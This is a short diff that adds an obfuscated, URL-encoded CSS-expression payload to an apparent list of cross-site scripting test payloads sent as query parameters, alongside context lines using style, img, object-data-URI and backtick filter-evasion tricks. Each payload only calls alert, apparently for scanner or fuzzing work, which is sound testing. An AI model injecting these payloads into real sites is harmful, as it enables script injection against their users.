@@ -14,3 +14,4 @@
 ?xssd=<style><img src=\"</style><img src=x onerror=alert(domain)//\">
 ?xsse=<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>
 ?xssf=<img src=\"x` `<script>alert(1)</script>\"` `>
+?xssg=0%20%73%54%79%4c%65%3d%58%3a%65%58%2f%2a%2a%2f%70%52%65%53%73%49%6f%4e%28%61%6c%65%72%74%28%36%36%31%35%35%29%29
